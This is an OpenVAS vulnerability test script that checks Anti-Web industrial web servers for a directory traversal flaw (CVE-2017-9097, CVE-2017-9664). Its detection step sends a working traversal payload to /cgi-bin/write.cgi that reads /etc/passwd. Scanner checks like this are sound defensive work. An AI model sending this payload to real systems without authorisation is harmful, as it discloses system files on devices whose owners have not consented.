##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_antiweb_dir_trav_vuln.nasl 7610 2017-11-01 13:14:39Z jschulte $
#
# Anti-Web Directory Traversal Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:anti-web:anti-web";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106886");
  script_version("$Revision: 7610 $");
  script_tag(name: "last_modification", value: "$Date: 2017-11-01 14:14:39 +0100 (Wed, 01 Nov 2017) $");
  script_tag(name: "creation_date", value: "2017-06-20 13:53:33 +0700 (Tue, 20 Jun 2017)");
  script_tag(name: "cvss_base", value: "6.4");
  script_tag(name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:N");

  script_cve_id("CVE-2017-9097", "CVE-2017-9664");

  script_tag(name: "qod_type", value: "exploit");

  script_tag(name: "solution_type", value: "NoneAvailable");

  script_name("Anti-Web Directory Traversal Vulnerability");

  script_category(ACT_GATHER_INFO);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_antiweb_detect.nasl");
  script_mandatory_keys("antiweb/installed");

  script_tag(name: "summary", value: "Anti-Web is prone to a directory traversal vulnerability where an
unauthenticated attacker can read arbitrary files.");

  script_tag(name: "vuldetect", value: "Sends a crafted HTTP POST request and checks the response.");

  script_tag(name: "solution", value: "No solution or patch is available as of 1st November, 2017. Information
regarding this issue will be updated once the solution details are available.");

  script_xref(name: "URL", value: "https://misteralfa-hack.blogspot.cl/2017/05/apps-industrial-ot-over-server-anti-web.html");
  script_xref(name: "URL", value: "https://ics-cert.us-cert.gov/advisories/ICSA-17-222-05");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

url = "/cgi-bin/write.cgi";

data = 'page=/&template=../../../../../../etc/passwd';

req = http_post_req(port: port, url: url, data: data,
                    add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "root:.*:0:[01]:") {
  report = "It was possible to obtain the /etc/passwd file through a HTTP POST request on " +
           report_vuln_url(port: port, url: url, url_only: TRUE);
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
